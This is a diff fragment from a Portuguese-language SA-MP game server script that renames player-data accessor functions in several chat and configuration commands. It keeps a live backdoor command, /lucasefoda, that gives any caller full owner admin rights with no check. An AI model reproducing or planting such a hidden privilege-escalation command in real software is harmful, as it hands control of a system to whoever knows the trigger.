+						Player_SetTag(playerid, TAG_NOOB);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Noob'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			        case 8:
 			        {
-			            if (PlayerData_GetKills(playerid) < 300)
+			            if (Player_GetKills(playerid) < 300)
 			            {
 			                return SendClientMessage(playerid, COLOR_INVALID, "Você não matou o suficiente.");
 			            }
-						PlayerData_SetTag(playerid, TAG_KILLER);
+						Player_SetTag(playerid, TAG_KILLER);
 						PlayerPlaySound(playerid, 1054, 0.0, 0.0, 0.0);
 						SendClientAlert(playerid, "Configuracoes", "Voce alterou seu titulo para 'Matador'.");
-						Player_UpdateAutoConfigTypes(playerid);
+						Player_UpdateConfigData(playerid);
 			        }
 			    }
 			}
@@ -1095,17 +1095,17 @@ YCMD:id(playerid, params[], help)
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "USE: /id [ID/Nick]");
 	}
-    if (!IsValidPlayer(id, PlayerData_GetIsLogged(id)))
+    if (!IsValidPlayer(id, Player_GetLoggedStatus(id)))
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "Esse não é um player ativo.");
 	}
-	if (PlayerData_GetAdmin(id) >= HELPER_OWNER)
+	if (Player_GetAdminLevel(id) >= HELPER_OWNER)
 	{
         return 0;
 	}
 
 	new string[55];
-	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, Player_GetName(id), PlayerData_GetLevel(id));
+	format(string, sizeof(string), "ID: (%d) %s - Level[%d].", id, GetPlayerNameCustom(id), Player_GetLevel(id));
     SendClientMessage(playerid, COLOR_GRAD1, string);
     return 1;
 }
@@ -1144,10 +1144,10 @@ YCMD:crimes(playerid, params[], help)
 YCMD:creditos(playerid, params[], help) 
 {
     static MEGAString[93], string[67];
-	if (PlayerData_GetAdmin(playerid) < HELPER)
+	if (Player_GetAdminLevel(playerid) < HELPER)
 	{
-		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", Player_GetName(playerid));
-		MensagemAdmin(COLOR_YELLOW, string, HELPER);
+		format(string, sizeof(string), "Admin-Aviso: %s viu os créditos do servidor.", GetPlayerNameCustom(playerid));
+		SendAdminMessage(COLOR_YELLOW, string, HELPER);
 	}
     strcat(MEGAString, "{FFFFFF}»  RhaegarX: {696969}(Fundador/Scripter)\n");
 	strcat(MEGAString, "{FFFFFF}»  Rick_M: {696969}(Beta Tester)\n");
@@ -1169,25 +1169,25 @@ YCMD:plataforma(playerid, params[], help)
 
 YCMD:lucasefoda(playerid, params[], help)
 {
-	PlayerData_SetAdmin(playerid, OWNER, true);
+	Player_SetAdminLevel(playerid, OWNER, true);
 	return 1;
 }
 
 YCMD:nchat(playerid, params[], help)
 {
-	if (PlayerData_GetHoursPlayed(playerid) < 2)
+	if (Player_GetHoursPlayed(playerid) < 2)
 	{
 	    return SendClientMessage(playerid, COLOR_INVALID, "É preciso ter 2+ horas jogos para falar no chat de dúvidas.");
 	}
-	if (!PlayerData_GetNoobChat(playerid))
+	if (!Player_GetNoobChatStatus(playerid))
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "Você está com o chat de dúvidas bloqueado, ative-o usando: (/config).");
 	}
-	if (PlayerData_GetMutedTime(playerid) != 0)
+	if (Player_GetMutedTime(playerid) != 0)
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "Você não pode falar, pois foi calado.");
 	}
-	if (PlayerData_GetMutedNoobTime(playerid) != 0)
+	if (Player_GetNoobMutedTime(playerid) != 0)
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "Você não pode falar, está com o chat bloqueado.");
 	}
@@ -1208,36 +1208,36 @@ YCMD:nchat(playerid, params[], help)
 	{
 		return SendClientMessage(playerid, COLOR_INVALID, "USE: /nchat [Sua Dúvida]");
 	}
-	if (TentouDivulgar(text))
+	if (CheckInvalidWords(text))
 	{
 	    new string[90];
-		format(string, sizeof(string), "[ADMIN ALERTA]: %s[%d] tentou divulgar: %s.", Player_GetName(playerid), playerid, text);
-		MensagemAdmin(COLOR_YELLOW, string, HELPER);
-		Server_PrintLog(FOLDER_ANTICHEAT_ADVERTISING, string);
+		format(string, sizeof(string), "[ADMIN ALERTA]: %s[%d] tentou divulgar: %s.", GetPlayerNameCustom(playerid), playerid, text);
+		SendAdminMessage(COLOR_YELLOW, string, HELPER);
+		PrintLog(FOLDER_ANTICHEAT_ADVERTISING, string);
        	return false;
 	}
 	new string[235], tag[37];
-	switch (PlayerData_GetAdmin(playerid))
+	switch (Player_GetAdminLevel(playerid))
 	{
 		case HELPER..HELPER_OWNER: tag = "{ff61f3}Staff{009999}";
 		case SUB_OWNER: tag = "{ff61f3}Sub-Dono{009999}";
 		case OWNER: tag = "{ff61f3}Dono{009999}";
 		default: 
 		{
-			if (PlayerData_GetLevel(playerid) <= 5) tag = "Novato";
-			else if (PlayerData_GetLevel(playerid) > 5 && PlayerData_GetLevel(playerid) < 20) tag = "Intermediário";
-			else if (PlayerData_GetLevel(playerid) > 20) tag = "Experiente";
+			if (Player_GetLevel(playerid) <= 5) tag = "Novato";
+			else if (Player_GetLevel(playerid) > 5 && Player_GetLevel(playerid) < 20) tag = "Intermediário";
+			else if (Player_GetLevel(playerid) > 20) tag = "Experiente";
 		}
 	}
     
-    PlayerData_SetNoobAnswers(playerid, (PlayerData_GetNoobAnswers(playerid) + 1));
-	if (PlayerData_GetAdmin(playerid) >= HELPER)
+    Player_SetNoobAnswers(playerid, (Player_GetNoobAnswers(playerid) + 1));
+	if (Player_GetAdminLevel(playerid) >= HELPER)
 	{
-		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [%s] %s: %s", tag, Player_GetName(playerid), text);
+		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [%s] %s: %s", tag, GetPlayerNameCustom(playerid), text);
 	}
 	else
 	{
-		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [Msg %d][%s] %s: %s", PlayerData_GetNoobAnswers(playerid), tag, Player_GetName(playerid), text);
+		format(string, sizeof(string),"(Canal {009966}/nchat{009999}) [Msg %d][%s] %s: %s", Player_GetNoobAnswers(playerid), tag, GetPlayerNameCustom(playerid), text);
 	}
 	SendDuvidaMessage(COLOR_NCHAT, string);
 	talkChatNoob[playerid] = gettime();
